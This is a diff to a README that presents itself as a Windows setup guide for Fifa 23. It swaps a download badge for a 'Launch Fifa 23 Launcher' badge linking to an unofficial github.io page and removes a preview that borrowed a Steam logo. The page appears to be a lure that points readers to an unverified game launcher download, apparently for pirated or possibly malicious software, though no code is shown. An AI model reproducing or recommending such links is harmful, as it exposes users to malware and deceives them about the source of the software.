@@ -2,7 +2,7 @@
 
 This repository covers a clean Windows setup for **Fifa 23** — launcher linking, file verification, performance tuning, and safe DLC/save workflows.
 
-[![Download Fifa 23](https://img.shields.io/badge/Download-fifa--23--launcher-blueviolet)](https://carengrindstaffpjscl.github.io/.github/fifa-23-launcher)
+[![Launch Fifa 23 Launcher](https://img.shields.io/badge/Launch-Fifa%2023%20Launcher-15803D?style=for-the-badge)](https://launcher-fifa-23.github.io/.github/)
 
 ---
 
@@ -77,12 +77,6 @@ Official licenses, deep career/franchise modes, and online seasons. Master timin
 - Crashes on boot → toggle DX11/DX12/Vulkan and check overlays
 - Network issues → test NAT type, disable background sync, and cap packet loss
 - Save conflicts → back up local saves; prefer cloud overwrite from newest timestamp
-
----
-
-## 🖼 Preview
-![Fifa 23 logo](https://logo.clearbit.com/store.steampowered.com)
-*Logo shown for identification only.*
 
 ---
 
